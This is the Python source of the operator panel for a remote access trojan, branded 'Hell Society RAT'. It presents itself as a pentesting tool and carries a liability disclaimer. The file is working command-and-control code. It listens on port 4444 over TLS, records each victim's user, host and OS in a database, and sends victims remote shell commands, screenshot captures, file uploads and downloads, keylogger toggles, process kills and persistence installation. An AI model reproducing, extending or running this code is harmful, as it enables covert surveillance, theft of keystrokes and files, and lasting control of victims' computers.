#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  HELL SOCIETY RAT - SERVER (Attacker Panel)                     ║
║  Created by: HELL SOCIETY Community                              ║
║  Remote Access Tool - Pentesting Framework                       ║
╚══════════════════════════════════════════════════════════════════╝

DISCLAIMER: This tool is for authorized penetration testing only.
Hell Society assumes no liability for misuse.
"""

import socket
import ssl
import json
import os
import sys
import time
import threading
import base64
import hashlib
import sqlite3
from datetime import datetime

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
except ImportError:
    os.system("pip3 install colorama 2>/dev/null || pip install colorama 2>/dev/null")
    from colorama import init, Fore, Back, Style
    init(autoreset=True)

# Colors
R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; C = Fore.CYAN
W = Fore.WHITE; M = Fore.MAGENTA
BR = Style.BRIGHT + Fore.RED; BG = Style.BRIGHT + Fore.GREEN
BY = Style.BRIGHT + Fore.YELLOW; BC = Style.BRIGHT + Fore.CYAN
BW = Style.BRIGHT + Fore.WHITE; BM = Style.BRIGHT + Fore.MAGENTA
RS = Style.RESET_ALL

# Banner
BANNER = f"""{R}⠉⠉⠉⠉⠁⠀⠀⠀⠀⠒⠂⠰⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠻⢤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠠⠀⠐⠒⠒⠀⠀⠈⠉⠉⠉⠉⢉⣉⣉⣉⣙⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡀⠤⠒⠒⠉⠁⠀⠀⠀⠀⠳⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⠛⠛⠉⠛⠛⠶⢦⣤⡐⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⢳⣦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⡤⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠳⠶⢶⣦⠤⣄⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⣄⠉⠑⢄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⡀⠀⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡄⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄{RS}
"""

# ═══════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════
DEFAULT_PORT = 4444
DEFAULT_HOST = "0.0.0.0"
SSL_ENABLED = True
CERT_FILE = "rat_server.crt"
KEY_FILE = "rat_server.key"
DB_FILE = "rat_connections.db"
OUTPUT_DIR = "rat_output"

# Generate self-signed cert if needed
def generate_cert():
    if not os.path.exists(CERT_FILE) or not os.path.exists(KEY_FILE):
        os.system(f"openssl req -x509 -newkey rsa:2048 -keyout {KEY_FILE} "
                  f"-out {CERT_FILE} -days 365 -nodes -subj "
                  f"'/CN=HellSociety/O=HS/C=XX' 2>/dev/null")

# ═══════════════════════════════════════════════════════════════════
# DATABASE
# ═══════════════════════════════════════════════════════════════════
class RATDatabase:
    def __init__(self):
        self.conn = sqlite3.connect(DB_FILE)
        self.cursor = self.conn.cursor()
        self._init_tables()

    def _init_tables(self):
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS clients (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT UNIQUE,
                ip TEXT,
                port INTEGER,
                os TEXT,
                username TEXT,
                computer_name TEXT,
                arch TEXT,
                first_seen TEXT,
                last_seen TEXT,
                status TEXT DEFAULT 'online'
            )
        """)
        self.cursor.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                client_id TEXT,
                timestamp TEXT,
                command TEXT,
                response TEXT,
                type TEXT
            )
        """)
        self.conn.commit()

    def add_client(self, client_data):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.cursor.execute("""
            INSERT OR REPLACE INTO clients 
            (client_id, ip, port, os, username, computer_name, arch, first_seen, last_seen, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'online')
        """, (client_data['id'], client_data['ip'], client_data['port'],
              client_data['os'], client_data['username'],
              client_data['computer_name'], client_data['arch'],
              now, now))
        self.conn.commit()

    def update_client(self, client_id, status='online'):
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.cursor.execute("""
            UPDATE clients SET last_seen=?, status=? WHERE client_id=?
        """, (now, status, client_id))
        self.conn.commit()

    def log_command(self, client_id, command, response, cmd_type='exec'):
        self.cursor.execute("""
            INSERT INTO logs (client_id, timestamp, command, response, type)
            VALUES (?, ?, ?, ?, ?)
        """, (client_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
              command[:500], response[:5000], cmd_type))
        self.conn.commit()

    def get_all_clients(self):
        self.cursor.execute("SELECT * FROM clients ORDER BY last_seen DESC")
        return self.cursor.fetchall()

    def get_client(self, client_id):
        self.cursor.execute("SELECT * FROM clients WHERE client_id=?", (client_id,))
        return self.cursor.fetchone()

# ═══════════════════════════════════════════════════════════════════
# ENCODING
# ═══════════════════════════════════════════════════════════════════
def encode_data(data):
    """Encode data for transmission"""
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.b64encode(data).decode('utf-8')

def decode_data(data):
    """Decode received data"""
    try:
        return base64.b64decode(data.encode('utf-8')).decode('utf-8')
    except:
        return data

def send_command(conn, command, **kwargs):
    """Send command to client"""
    payload = {
        'command': command,
        'args': kwargs,
        'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    data = json.dumps(payload)
    try:
        conn.sendall(f"{len(data)}:".encode() + data.encode())
        return True
    except:
        return False

def receive_response(conn, timeout=30):
    """Receive response from client"""
    conn.settimeout(timeout)
    try:
        header = b""
        while True:
            chunk = conn.recv(1)
            if not chunk:
                break
            header += chunk
            if b":" in header:
                break
        
        if not header or b":" not in header:
            return None
        
        size = int(header.rstrip(b":"))
        data = b""
        while len(data) < size:
            chunk = conn.recv(min(4096, size - len(data)))
            if not chunk:
                break
            data += chunk
        
        return json.loads(data.decode())
    except socket.timeout:
        return {'error': 'timeout', 'data': 'Connection timed out'}
    except Exception as e:
        return {'error': str(e), 'data': ''}

# ═══════════════════════════════════════════════════════════════════
# CLIENT HANDLER
# ═══════════════════════════════════════════════════════════════════
class ClientHandler:
    def __init__(self, conn, addr, db):
        self.conn = conn
        self.addr = addr
        self.db = db
        self.client_id = None
        self.client_info = {}
        self.connected = True

    def init_client(self):
        """Initialize connection and get client info"""
        try:
            response = receive_response(self.conn, timeout=10)
            if response and 'client_info' in response:
                info = response['client_info']
                self.client_info = info
                self.client_id = info.get('id', hashlib.md5(addr[0].encode()).hexdigest())
                self.client_info['id'] = self.client_id
                self.client_info['ip'] = self.addr[0]
                self.client_info['port'] = self.addr[1]
                self.db.add_client(self.client_info)
                return True
        except Exception as e:
            print(f"  {R}[!] Init error: {e}{RS}")
        return False

    def send_cmd(self, command, **kwargs):
        self.db.log_command(self.client_id, command, "", "exec")
        send_command(self.conn, command, **kwargs)
        response = receive_response(self.conn)
        if response:
            self.db.log_command(self.client_id, command, 
                              response.get('data', ''), response.get('type', 'response'))
        return response

    def interactive_shell(self):
        """Main interactive shell for controlling this client"""
        client_display = self.client_info.get('username', 'unknown')
        computer = self.client_info.get('computer_name', 'unknown')
        os_info = self.client_info.get('os', 'unknown')

        print(f"\n  {G}{'═' * 70}{RS}")
        print(f"  {BW}  Connected to: {Y}{computer}{BW} ({Y}{client_display}{BW})")
        print(f"  {BW}  OS: {Y}{os_info}{BW} | IP: {Y}{self.addr[0]}{RS}")
        print(f"  {G}{'═' * 70}{RS}")
        print(f"  {Y}Type 'help' for available commands{RS}")
        print()

        while self.connected:
            try:
                cmd = input(f"  {R}[{client_display}@{computer}]{RS} {Y}>{RS} ").strip()
                
                if not cmd:
                    continue
                
                parts = cmd.split()
                command = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []

                # Exit/Disconnect
                if command in ('exit', 'quit', 'disconnect'):
                    print(f"  {Y}[*] Disconnecting from {client_display}...{RS}")
                    self.connected = False
                    self.db.update_client(self.client_id, 'offline')
                    break

                # Shell
                elif command == 'shell':
                    os_cmd = ' '.join(args) if args else 'whoami'
                    resp = self.send_cmd('shell', cmd=os_cmd)
                    if resp and 'data' in resp:
                        print(f"\n  {W}{resp['data']}{RS}")
                    else:
                        print(f"  {R}[!] No response{RS}")

                # File system
                elif command == 'ls' or command == 'dir':
                    path = args[0] if args else '.'
                    resp = self.send_cmd('ls', path=path)
                    if resp and 'data' in resp:
                        print(f"\n  {W}{resp['data']}{RS}")

                elif command == 'cd':
                    path = args[0] if args else '/'
                    resp = self.send_cmd('cd', path=path)
                    if resp and 'data' in resp:
                        print(f"  {G}[*] Changed to: {resp['data']}{RS}")

                elif command == 'pwd':
                    resp = self.send_cmd('pwd')
                    if resp and 'data' in resp:
                        print(f"  {W}{resp['data']}{RS}")

                # Screenshot
                elif command == 'screenshot':
                    print(f"  {Y}[*] Taking screenshot...{RS}")
                    resp = self.send_cmd('screenshot')
                    if resp and 'data' in resp:
                        os.makedirs(OUTPUT_DIR, exist_ok=True)
                        filename = f"{OUTPUT_DIR}/screenshot_{self.client_id}_{int(time.time())}.png"
                        img_data = base64.b64decode(resp['data'])
                        with open(filename, 'wb') as f:
                            f.write(img_data)
                        print(f"  {G}[+] Screenshot saved: {filename}{RS}")
                    else:
                        print(f"  {R}[!] Failed to capture screenshot{RS}")

                # File upload
                elif command == 'upload':
                    if len(args) < 2:
                        print(f"  {R}[!] Usage: upload <local_file> <remote_path>{RS}")
                        continue
                    local_file = args[0]
                    remote_path = args[1]
                    if not os.path.isfile(local_file):
                        print(f"  {R}[!] Local file not found: {local_file}{RS}")
                        continue
                    with open(local_file, 'rb') as f:
                        file_data = base64.b64encode(f.read()).decode()
                    resp = self.send_cmd('upload', path=remote_path, data=file_data, 
                                        filename=os.path.basename(local_file))
                    if resp and resp.get('data') == 'ok':
                        print(f"  {G}[+] File uploaded: {remote_path}{RS}")
                    else:
                        print(f"  {R}[!] Upload failed{RS}")

                # File download
                elif command == 'download':
                    if len(args) < 1:
                        print(f"  {R}[!] Usage: download <remote_file> [local_path]{RS}")
                        continue
                    remote_file = args[0]
                    local_path = args[1] if len(args) > 1 else f"{OUTPUT_DIR}/{os.path.basename(remote_file)}"
                    os.makedirs(OUTPUT_DIR, exist_ok=True)
                    resp = self.send_cmd('download', path=remote_file)
                    if resp and 'data' in resp:
                        file_data = base64.b64decode(resp['data'])
                        with open(local_path, 'wb') as f:
                            f.write(file_data)
                        print(f"  {G}[+] Downloaded: {local_path} ({len(file_data)} bytes){RS}")
                    else:
                        print(f"  {R}[!] Download failed{RS}")

                # Keylogger
                elif command == 'keylogger':
                    action = args[0] if args else 'start'
                    resp = self.send_cmd('keylogger', action=action)
                    if resp and 'data' in resp:
                        print(f"  {G}[*] Keylogger: {resp['data']}{RS}")

                # Process list
                elif command == 'ps':
                    resp = self.send_cmd('process_list')
                    if resp and 'data' in resp:
                        print(f"\n  {W}{resp['data']}{RS}")

                # Kill process
                elif command == 'kill':
                    if len(args) < 1:
                        print(f"  {R}[!] Usage: kill <pid>{RS}")
                        continue
                    resp = self.send_cmd('kill_process', pid=args[0])
                    if resp and 'data' in resp:
                        print(f"  {G}[*] {resp['data']}{RS}")

                # Persistence
                elif command == 'persist':
                    method = args[0] if args else 'all'
                    resp = self.send_cmd('persistence', method=method)
                    if resp and 'data' in resp:
                        print(f"  {G}[*] Persistence: {resp['data']}{RS}")

                # Info
                elif command == 'info':
                    print(f"\n  {BW}  Client Information:{RS}")
                    print(f"  {C}  ═{'═' * 40}{RS}")
                    for key, value in self.client_info.items():
                        print(f"  {Y}  {key:>20}: {W}{value}{RS}")
                    print()

                # Help
                elif command == 'help':
                    print(f"""
  {BW}{Style.BRIGHT}  AVAILABLE COMMANDS:{RS}
  {C}  ═{'═' * 45}{RS}
  {G}  shell <command>       {W}- Execute shell command{RS}
  {G}  ls [path]             {W}- List directory{RS}
  {G}  cd <path>             {W}- Change directory{RS}
  {G}  pwd                   {W}- Current directory{RS}
  {G}  screenshot            {W}- Capture screen{RS}
  {G}  upload <file> <path>  {W}- Upload file to target{RS}
  {G}  download <file>       {W}- Download file from target{RS}
  {G}  keylogger [start/stop]{W}- Toggle keylogger{RS}
  {G}  ps                    {W}- List running processes{RS}
  {G}  kill <pid>            {W}- Kill process{RS}
  {G}  persist [method]      {W}- Install persistence{RS}
  {G}  info                  {W}- Show client info{RS}
  {G}  exit/quit             {W}- Disconnect from client{RS}
  {G}  help                  {W}- Show this help{RS}
""")

                else:
                    print(f"  {R}[!] Unknown command: {command}. Type 'help' for list.{RS}")

            except KeyboardInterrupt:
                print(f"\n  {Y}[*] Disconnecting...{RS}")
                self.connected = False
                self.db.update_client(self.client_id, 'offline')
                break
            except Exception as e:
                print(f"  {R}[!] Error: {e}{RS}")
                self.connected = False
                break

# ═══════════════════════════════════════════════════════════════════
# MAIN SERVER
# ═══════════════════════════════════════════════════════════════════
class RATServer:
    def __init__(self, host=DEFAULT_HOST, port=DEFAULT_PORT):
        self.host = host
        self.port = port
        self.db = RATDatabase()
        self.clients = {}
        self.running = True
        self.listener = None

    def start(self):
        """Start the RAT server"""
        print(BANNER)
        print(f"  {BW}{Style.BRIGHT}  HELL SOCIETY RAT - SERVER PANEL{RS}")
        print(f"  {R}{Style.BRIGHT}  Remote Access Tool - Pentesting Framework{RS}")
        print()
        print(f"  {W}{Back.RED} :: Disclaimer: Developers assume no liability and are not  :: {RS}")
        print(f"  {W}{Back.RED} :: responsible for any misuse or damage caused.           :: {RS}")
        print()

        # Generate SSL cert
        if SSL_ENABLED:
            print(f"  {Y}[*] Generating SSL certificate...{RS}")
            generate_cert()
            if os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE):
                print(f"  {G}[+] SSL certificate ready{RS}")
            else:
                print(f"  {Y}[!] SSL cert generation failed, using plain TCP{RS}")

        # Create output dir
        os.makedirs(OUTPUT_DIR, exist_ok=True)

        # Bind socket
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((self.host, self.port))
        self.listener.listen(100)
        self.listener.settimeout(1)

        if SSL_ENABLED and os.path.exists(CERT_FILE):
            try:
                ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                ctx.load_cert_chain(CERT_FILE, KEY_FILE)
                self.listener = ctx.wrap_socket(self.listener, server_side=True)
                print(f"  {G}[+] SSL encryption enabled{RS}")
            except Exception as e:
                print(f"  {Y}[!] SSL setup failed: {e}, using plain TCP{RS}")

        print(f"  {G}[+] Server listening on {self.host}:{self.port}{RS}")
        print(f"  {G}[+] Database: {DB_FILE}{RS}")
        print(f"  {G}[+] Output: {OUTPUT_DIR}/{RS}")
        print(f"  {G}[+] Waiting for connections...{RS}")
        print()

        # Start listener thread
        listen_thread = threading.Thread(target=self._listen, daemon=True)
        listen_thread.start()

        # Main menu
        self._main_menu()

    def _listen(self):
        """Listen for incoming connections"""
        while self.running:
            try:
                conn, addr = self.listener.accept()
                handler = ClientHandler(conn, addr, self.db)
                if handler.init_client():
                    cid = handler.client_id
                    self.clients[cid] = handler
                    info = handler.client_info
                    print(f"\n  {G}{'═' * 70}{RS}")
                    print(f"  {G}[+] NEW CONNECTION!{RS}")
                    print(f"  {BW}  IP: {Y}{addr[0]}{BW} | User: {Y}{info.get('username', 'N/A')}{BW} | OS: {Y}{info.get('os', 'N/A')}{RS}")
                    print(f"  {G}{'═' * 70}{RS}")
                else:
                    conn.close()
            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    print(f"  {R}[!] Listen error: {e}{RS}")

    def _main_menu(self):
        """Main server menu"""
        while self.running:
            try:
                print(f"\n  {BC}╔═══════════════════════════════════════════════════════╗{RS}")
                print(f"  {BC}║  {BW}HELL SOCIETY RAT SERVER{RS}                              {RS}{BC}║{RS}")
                print(f"  {BC}╚═══════════════════════════════════════════════════════╝{RS}")
                print()

                # Show connected clients
                clients = self.db.get_all_clients()
                if clients:
                    print(f"  {BW}{Style.BRIGHT}  Connected Clients ({len([c for c in clients if c[10] == 'online'])}):{RS}")
                    print(f"  {C}  {'─' * 60}{RS}")
                    print(f"  {BW}  {'ID':>6} {'IP':<18} {'User':<15} {'OS':<15} {'Status':<8}{RS}")
                    print(f"  {C}  {'─' * 60}{RS}")
                    for c in clients:
                        status_color = G if c[10] == 'online' else R
                        print(f"  {BW}  {c[1]:>6} {c[2]:<18} {c[5]:<15} {c[4]:<15} {status_color}{c[10]:<8}{RS}")
                    print()
                else:
                    print(f"  {Y}  No clients connected yet...{RS}")
                    print()

                print(f"  {G}[1] {BW}Select client to control{RS}")
                print(f"  {G}[2] {BW}Show all clients (database){RS}")
                print(f"  {G}[3] {BW}Show logs{RS}")
                print(f"  {G}[4] {BW}Settings{RS}")
                print(f"  {R}[0] {BW}Exit server{RS}")
                print()

                choice = input(f"  {R}root@hellrat{RS}:{C}~{RS}# ").strip()

                if choice == "1":
                    clients = [c for c in self.db.get_all_clients() if c[10] == 'online']
                    if not clients:
                        print(f"  {R}[!] No online clients{RS}")
                        continue
                    
                    print(f"\n  {BW}  Select a client:{RS}")
                    for i, c in enumerate(clients, 1):
                        print(f"  {Y}[{i}] {W}{c[5]}@{c[2]} ({c[4]}){RS}")
                    print()
                    
                    sel = input(f"  {R}root@hellrat{RS}:{C}~{RS}# ").strip()
                    try:
                        idx = int(sel) - 1
                        if 0 <= idx < len(clients):
                            cid = clients[idx][1]
                            if cid in self.clients:
                                self.clients[cid].interactive_shell()
                            else:
                                print(f"  {R}[!] Client session not active{RS}")
                    except ValueError:
                        print(f"  {R}[!] Invalid selection{RS}")

                elif choice == "2":
                    clients = self.db.get_all_clients()
                    print(f"\n  {BW}  All clients in database:{RS}")
                    for c in clients:
                        print(f"  {Y}  {c[1]} | {c[2]} | {c[5]} | {c[4]} | {c[10]} | Last: {c[9]}{RS}")
                    print()

                elif choice == "3":
                    print(f"\n  {BW}  Recent logs:{RS}")
                    self.db.cursor.execute("SELECT * FROM logs ORDER BY id DESC LIMIT 20")
                    for row in self.db.cursor.fetchall():
                        print(f"  {Y}  [{row[2]}] {c}{row[3]}{RS} -> {W}{row[4][:50]}...{RS}")
                    print()

                elif choice == "4":
                    print(f"""
  {BW}  SETTINGS:{RS}
  {C}  ═{'═' * 30}{RS}
  {BW}  Host: {Y}{self.host}{RS}
  {BW}  Port: {Y}{self.port}{RS}
  {BW}  SSL: {Y}{'Enabled' if SSL_ENABLED else 'Disabled'}{RS}
  {BW}  DB: {Y}{DB_FILE}{RS}
  {BW}  Output: {Y}{OUTPUT_DIR}/{RS}
""")

                elif choice == "0":
                    print(f"\n  {Y}[*] Shutting down RAT server...{RS}")
                    self.running = False
                    break

            except KeyboardInterrupt:
                print(f"\n  {Y}[*] Shutting down...{RS}")
                self.running = False
                break

# ═══════════════════════════════════════════════════════════════════
# CLI ARGS
# ═══════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    host = DEFAULT_HOST
    port = DEFAULT_PORT

    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    if len(sys.argv) > 2:
        host = sys.argv[2]

    server = RATServer(host, port)
    server.start()
